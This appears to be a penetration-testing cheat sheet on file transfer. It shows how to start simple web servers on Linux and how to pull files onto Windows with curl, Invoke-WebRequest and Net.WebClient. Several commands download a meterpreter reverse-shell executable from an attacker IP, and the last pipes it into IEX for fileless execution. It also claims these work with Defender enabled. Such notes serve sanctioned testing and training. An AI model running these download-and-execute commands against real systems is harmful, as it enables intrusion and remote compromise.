# Linux File Transfer Methods

## Web Transfer

### Using Python&#x20;

{% code overflow="wrap" %}
```bash
python3 -m http.server <port if you want to specify> 
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>

### Using PHP&#x20;

{% code overflow="wrap" %}
```bash
sudo php -S 0.0.0.0:<port>
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (611).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
_Note that the PHP server does not provide directory listing. It only allows files to be downloaded directly by specifying their path._
{% endhint %}

### Using Ruby&#x20;

{% code overflow="wrap" %}
```bash
ruby -run -e httpd . -p <port> 
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (612).png" alt=""><figcaption></figcaption></figure>

### Using busybox&#x20;

{% code overflow="wrap" %}
```bash
busybox httpd -f -p <port>
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (613).png" alt=""><figcaption></figcaption></figure>

## Web Download (Windows)

{% hint style="info" %}
_Note that everything shown below was performed with Windows Defender and Windows Firewall enabled, so these techniques should work under the default Windows configuration._
{% endhint %}

### Using curl&#x20;

{% code overflow="wrap" %}
```powershell
curl <web> -o <file output location> -s
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (616).png" alt=""><figcaption></figcaption></figure>

### Using Invoke-WebRequest

{% code overflow="wrap" %}
```powershell
Invoke-WebRequest http://<attacker-ip>:8000/file.exe -OutFile file.exe
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (617).png" alt=""><figcaption></figcaption></figure>

### Using Net.WebClient

#### DownloadFile

{% hint style="info" %}
_Note that writing full path is mandatory while using the below method._&#x20;
{% endhint %}

{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadFile('http://192.168.16.129:8080/meterpreter_reverse_tcp.exe','<full path>')
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>

#### DownloadFileAsync

{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadFileAsync('http://192.168.16.129:8080/meterpreter_reverse_tcp.exe','C:\Users\sqluser\temp\webclientasync.exe')
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>

#### DownloadString

{% hint style="info" %}
_Note that the DownloadString method return plain string we need to store it into a file for using it._&#x20;
{% endhint %}

{% code overflow="wrap" %}
```bash
(New-Object Net.WebClient).DownloadString('http://192.168.16.129:8080/meterpreter_reverse_tcp.exe') > stringfiledownload.exe
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (619).png" alt=""><figcaption></figcaption></figure>

### DownloadString - Fileless Method

{% hint style="info" %}
Note that IEX can only execute .ps1 file directly from the web.&#x20;
{% endhint %}

#### Sender side&#x20;



{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadString('http://192.168.16.129:8080/meterpreter_reverse_tcp.exe') | IEX
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>

